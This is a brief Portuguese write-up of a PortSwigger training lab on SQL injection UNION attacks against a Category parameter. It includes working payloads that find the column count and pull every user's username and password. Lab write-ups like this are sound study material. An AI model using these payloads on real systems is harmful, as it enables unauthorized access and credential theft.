# Web-Security-Writeups - PortSwigger SQLi Labs

## Lab 4: SQL Injection UNION attack, retrieving data from other tables

**Objetivo:** Descobrir o número total de colunas e depois achar as senhas dos usuários no filtro categoria.

**Vulnerabilidade encontrada:**
no parâmetro `?Category=` estava concatenando direto no SQL. Ao injetar `'` deu erro 500.

**Meu processo:**
1. Descobri o número de colunas com `'+UNION+SELECT+NULL,NULL--` são 2 colunas.
2. Inseri a injeção`'+UNION+SELECT+username,password FROM users--` retornou os nomes e senhas de todos os usuários.

**Payload final:**
```sql
'+UNION+SELECT+NULL,NULL--
'+UNION+SELECT+username,password FROM users--
